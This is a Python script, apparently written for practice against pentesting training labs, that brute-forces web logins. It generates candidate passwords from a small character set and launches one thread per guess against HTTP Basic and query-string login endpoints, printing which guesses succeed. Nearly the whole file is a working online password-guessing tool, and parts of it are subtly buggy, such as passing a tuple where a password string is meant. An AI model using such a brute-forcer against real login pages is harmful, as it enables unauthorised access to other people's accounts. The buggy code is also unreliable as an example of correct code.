import requests
from itertools import combinations, product
import threading

# url = "https://attack.samsclass.info/basic0/"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/1"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/auth/1/login"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email=123%40gmail.com&password=123"

proxy = {
    "http" : "127.0.0.1:8080"
}
credentials = {
    "email": "admin@pentesteracademy.com",
    "password": "zzzxy"
}
# response = requests.head(url, params = credentials)

# auths = requests.auth.HTTPBasicAuth("root", "password")
# response = requests.head(url, auth = auths)
# print(response.headers)

# print(response.headers)


def generatePass(characters, length):
    return list(product(characters, repeat=length))

passList = generatePass(["m", "n", "o"], 5)
usernameList = ["nick"]

def attemptAccountPrompt(link1, username, password):
    auths = requests.auth.HTTPBasicAuth(username, password)
    response = requests.get(link1, auth = auths)
    if (response.text.find("Failed! Please try again!") != -1):
        print(f"[{username}, {password}]: Failed\n")
    else:
        print(f"[{username}, {password}]: Successfullyyyyyyyyyyyyyyyyyyyyyyyyyyyy\n")
        exit(1)
def attemptPassPrompt(link1, username, passList):
    for password in passList:
        AttemptPass = "".join(password)
        thread = threading.Thread(target=attemptAccountPrompt, args=(link1, username, AttemptPass))
        thread.start()

def attemptPrompt(link1):
    for username in usernameList:
        thread = threading.Thread(target=attemptPassPrompt, args=(link1, username, passList))
        thread.start()

def attemptAccount(username, passStrings):
    AttemptPass = "".join(passStrings)

    # credentials = {
    #     "email": username+"@pentesteracacdemy.com",
    #     "password": AttemptPass
    # }

    # response = requests.get(url, params = credentials)
    
    # response = requests.get(url, auth = auths)
    link1 = f"https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email={username}"+"%40pentesteracacdemy.com"+f"&password={passStrings}"
    
    auths = requests.auth.HTTPBasicAuth(username, passStrings)
    response = requests.get(link1, auth = auths)
    # thread = threading.Thread(attemptPrompt(link1))
    # thread.start()
    if (response.text.find("Unauthorized! Unauthorized! Unauthorized :) :)") != -1):
        print(f"[{username}, {AttemptPass}]: Failed\n")
    else:
        print(f"[{username}, {AttemptPass}]: Successfully\n")
        exit(1)

def bruteforcePass(username, passList):
    for passStrings in passList:
        thread = threading.Thread(target=attemptAccount, args=(username, passStrings))
        thread.start()
        # attemptAccount(username, passStrings)

def bruteforceAccount(usernameList, passList):
    for username in usernameList:
        thread = threading.Thread(target=bruteforcePass, args=(username, passList))
        thread.start()
        # bruteforcePass(username, passList)

bruteforceAccount(usernameList, passList)

